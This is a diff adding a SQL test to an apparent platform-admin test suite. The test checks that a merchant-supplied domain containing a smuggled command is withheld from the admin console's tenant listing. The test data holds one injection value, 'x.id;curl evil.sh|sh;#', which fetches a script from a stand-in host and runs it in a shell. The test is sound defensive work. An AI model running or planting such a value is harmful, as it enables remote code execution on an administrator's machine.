@@ -29,5 +29,15 @@ do $$ begin
   assert (select plan from public.tenants where slug = 'kopiadmin') = 'pro', 'plan set';
   assert exists (select 1 from public.audit_log where action = 'tenant.plan' and subject = 'pro'), 'plan change audited';
 end $$;
+-- what a merchant writes never breaks or arms the console: a domain that is not a host name (a shell command the admin
+-- would copy into a root terminal) is not shown, and a malformed date in its documents doesn't fail the listing
+set local role authenticated;
+select set_config('request.jwt.claim.sub', '00000000-0000-0000-0000-0000000000e1', true);
+select public.bn_write((select id from t), '[{"op":"put","coll":"versions","id":"vd1","data":{"id":"vd1","kind":"page","status":"published","at":"x","data":{"tool":"domain","values":{"menu":"x.id;curl evil.sh|sh;#"}}}}]'::jsonb, 'x', 'budi');
+select set_config('request.jwt.claim.sub', '00000000-0000-0000-0000-0000000000e2', true);
+do $$ declare r jsonb := public.bn_admin_tenants(); begin
+  assert (select x->>'domain' from jsonb_array_elements(r) x where x->>'slug' = 'kopiadmin') is null, 'no command in the domain column: ' || r::text;
+end $$;
+reset role;
 select 'platform admin holds' as result;
 rollback;
